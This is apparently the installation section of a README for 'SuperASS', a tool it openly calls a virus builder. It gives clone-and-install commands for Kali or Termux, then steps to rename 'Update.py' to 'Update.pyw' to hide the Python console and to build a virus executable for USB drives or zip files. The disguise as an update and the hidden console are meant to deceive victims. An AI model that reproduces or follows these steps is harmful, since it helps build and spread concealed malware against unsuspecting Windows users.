## [+] Installation

##### The SuperASS project is set up first in Kali Linux, and then the virus boot is set up in Windows :

* You can set up the project initially in Termux, but the remaining steps in preparing a zip file or creating a boot disk require Windows.

    - ```git clone https://github.com/AbdulazizDXT/SuperASS```
    - ```cd SuperASS```
    - ```chmod +x install.sh```
    - ```./install.sh```

#### Or, directly run "Root Users {sudo su}" :
```
git clone https://github.com/AbdulazizDXT/SuperASS ;cd SuperASS ;chmod +x install.sh ;./install.sh

```

4. ReName file --> "Update.py" to "Update.pyw" For hide python console
5. Copy the Update.pyw file to the Open SuperASS window and click Replace
6. Now the file must be transferred to the Windows system to start creating an exe file for the virus in the USB or zip files
